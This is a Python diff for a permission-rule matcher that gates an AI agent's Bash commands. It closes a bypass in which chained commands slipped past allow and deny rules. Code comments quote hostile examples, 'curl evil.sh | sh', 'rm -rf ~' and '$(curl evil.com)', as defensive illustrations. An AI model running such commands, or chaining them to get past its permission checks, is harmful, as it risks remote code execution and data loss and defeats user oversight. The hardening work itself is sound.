@@ -706,6 +706,15 @@ def make_rule(tool: str, tinput: dict, cfg: dict):
             # prompt flow checks mintability BEFORE the toast and hides the Always
             # button, so this None is never a silent downgrade.
             return None
+        if _bash_allow_parts(cmd) != [cmd]:
+            # A compound command can never be granted by a single rule: Claude
+            # requires every subcommand to match, so 'Bash(a && b)' is a rule
+            # that matches nothing, and the prefix form 'Bash(a:*)' would grant
+            # only the half the user eyeballed while silently covering every
+            # other command sharing that head. Refuse both — 'Always' degrades
+            # to a one-time 'Yes'. This is also what keeps mint/match
+            # round-tripping now that the matcher splits.
+            return None
         if cfg["approval"]["bash_always_mode"] == "prefix":
             head = " ".join(cmd.split()[:2])
             return f"Bash({head}:*)"
@@ -724,7 +733,117 @@ def make_rule(tool: str, tinput: dict, cfg: dict):
     return None
 
 
-def _bash_match(cmd: str, inner: str, broad: bool = False) -> bool:
+# Claude's documented Bash separators. The two matching directions are NOT
+# symmetric and must not share a matcher: an allow rule has to match EVERY
+# subcommand, while a deny/ask rule fires if ANY subcommand matches. Collapsing
+# them (as noti did through v0.6.1, by prefix-matching the whole command string)
+# is a silent bypass in both directions at once — `Bash(ls -la:*)` allowed
+# `ls -la && curl evil.sh | sh`, and `Bash(rm *)` failed to deny `ls && rm -rf ~`.
+# Claude's list, split by token width so the scanner can try the 2-char forms first.
+_BASH_SEP2 = ("&&", "||", "|&")
+_BASH_SEP1 = ";|&\n"
+
+# Deny-side splitting only: control-flow words and a leading VAR=... assignment
+# sit in front of the real verb in a fragment ('do rm -rf $f'). Peeling them off
+# can only ever expose MORE commands to a deny rule, which is the safe direction.
+_BASH_KEYWORDS = {"if", "then", "else", "elif", "fi", "for", "while", "until",
+                  "do", "done", "case", "esac", "select", "time", "!", "{", "}"}
+_BASH_DENY_SPLIT = re.compile(r"\$\(|[;|&\n()`{}]+")
+_BASH_ASSIGN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+
+
+def _bash_allow_parts(cmd: str):
+    """Top-level subcommands for ALLOW matching; None if it can't be split.
+
+    Claude: "a rule like Bash(safe-cmd *) won't give it permission to run the
+    command safe-cmd && other-cmd ... A rule must match each subcommand
+    independently." None is the fail-closed answer — the caller refuses the
+    allow and the user gets a toast.
+
+    Command substitution and subshells return None outright rather than being
+    descended into: the command inside is a subcommand the rule was never
+    checked against (`ls -la $(curl evil.com)` must not ride in on an ls rule),
+    and choosing which half of that string a rule covers is not noti's call.
+    """
+    parts, buf, i, n = [], [], 0, len(cmd)
+    quote = ""
+    while i < n:
+        c = cmd[i]
+        if quote:                    # inside '...' or "...": a separator is literal text
+            buf.append(c)
+            if c == "\\" and quote == '"' and i + 1 < n:
+                buf.append(cmd[i + 1])
+                i += 2
+                continue
+            if c == quote:
+                quote = ""
+            i += 1
+            continue
+        if c == "\\":
+            if i + 1 >= n:
+                return None          # trailing backslash: a continuation, so incomplete
+            buf.append(c)
+            buf.append(cmd[i + 1])
+            i += 2
+            continue
+        if c in "'\"":
+            quote = c
+            buf.append(c)
+            i += 1
+            continue
+        if c in "`(":
+            return None              # substitution / subshell — see docstring
+        if cmd[i:i + 2] in _BASH_SEP2:
+            parts.append("".join(buf))
+            buf = []
+            i += 2
+            continue
+        if c in _BASH_SEP1:
+            parts.append("".join(buf))
+            buf = []
+            i += 1
+            continue
+        buf.append(c)
+        i += 1
+    if quote:
+        return None                  # unbalanced quote; bash would error on it too
+    parts.append("".join(buf))
+    parts = [p.strip() for p in parts]
+    if any(not p for p in parts):
+        # A dangling `npm test &&` (or a stray `;;`) leaves an empty slot.
+        # Claude calls that unparseable and refuses to allow it; mirror that
+        # rather than inventing a third behavior. Costs a toast on `ls;`.
+        return None
+    return parts
+
+
+def _bash_deny_parts(cmd: str):
+    """Every fragment a DENY/ASK rule must be tested against.
+
+    Claude: "Deny and ask rules apply when any subcommand matches them,
+    including a command nested inside a subshell, a command substitution, or a
+    control-flow body such as a for loop." The split is deliberately crude —
+    quoting is ignored — because that can only yield MORE candidates than a real
+    parse would, and over-denying is the safe direction. The raw command is
+    always included so this can never match less than the old whole-string
+    matcher did.
+    """
+    out = [cmd]
+    for frag in _BASH_DENY_SPLIT.split(cmd):
+        frag = frag.strip()
+        while frag:                    # peel 'do', 'then', 'FOO=bar', ... off the verb
+            head = frag.split(None, 1)
+            if head[0] in _BASH_KEYWORDS or _BASH_ASSIGN.match(head[0]):
+                frag = head[1].strip() if len(head) > 1 else ""
+                continue
+            break
+        if frag:
+            out.append(frag)
+    return out
+
+
+def _bash_rule_hit(cmd: str, inner: str, broad: bool) -> bool:
+    """Match ONE subcommand against one rule's inner text."""
     for suf in (":*", " *"):     # Claude's two word-boundary prefix spellings
         if inner.endswith(suf):
             prefix = inner[:-2].rstrip()
@@ -741,6 +860,13 @@ def _bash_match(cmd: str, inner: str, broad: bool = False) -> bool:
                                  # * LITERAL: Claude reads it as a prefix, but treating
                                  # it that way would broaden what an allow rule covers —
                                  # stricter is safe there (worst case: an extra toast).
+
+
+def _bash_match(cmd: str, inner: str, broad: bool = False) -> bool:
+    if broad:
+        return any(_bash_rule_hit(p, inner, True) for p in _bash_deny_parts(cmd))
+    parts = _bash_allow_parts(cmd)
+    return bool(parts) and all(_bash_rule_hit(p, inner, False) for p in parts)
 
 
 def _glob_rx(pat: str) -> str:
@@ -773,8 +899,9 @@ def _host_match(host: str, dom: str) -> bool:
 
 
 def pattern_matches(tool: str, tinput: dict, pat: str, cwd: str = "", broad: bool = False) -> bool:
-    # broad=True is DENY matching: widen a bare trailing * in a Bash rule to a
-    # prefix (see _bash_match) so noti can't under-match and bypass a deny.
+    # broad=True is DENY matching: match if ANY subcommand hits, and widen a bare
+    # trailing * to a prefix, so noti can't under-match and bypass a deny.
+    # broad=False is ALLOW matching: EVERY subcommand must hit (see _bash_match).
     cwd = cwd or os.getcwd()
     if "(" not in pat:
         if pat == tool:
@@ -804,6 +931,18 @@ def pattern_matches(tool: str, tinput: dict, pat: str, cwd: str = "", broad: boo
 
 
 def matches_any(tool: str, tinput: dict, patterns, cwd: str = "", broad: bool = False) -> bool:
+    if tool == "Bash" and not broad:
+        # ALLOW coverage is computed across the whole rule SET, not rule by rule.
+        # Claude requires each subcommand to be matched by some rule, not by the
+        # same one: `git log && git status` is granted by the pair
+        # Bash(git log:*) + Bash(git status:*), and asking one rule to cover both
+        # halves would refuse it for no safety gain. Every part must still be
+        # covered by something, and an unsplittable command still fails closed.
+        parts = _bash_allow_parts((tinput.get("command") or "").strip())
+        if not parts:
+            return False
+        return all(any(pattern_matches(tool, {"command": part}, p, cwd) for p in patterns)
+                   for part in parts)
     return any(pattern_matches(tool, tinput, p, cwd, broad) for p in patterns)
 
 # ---------------------------------------------------------------------------
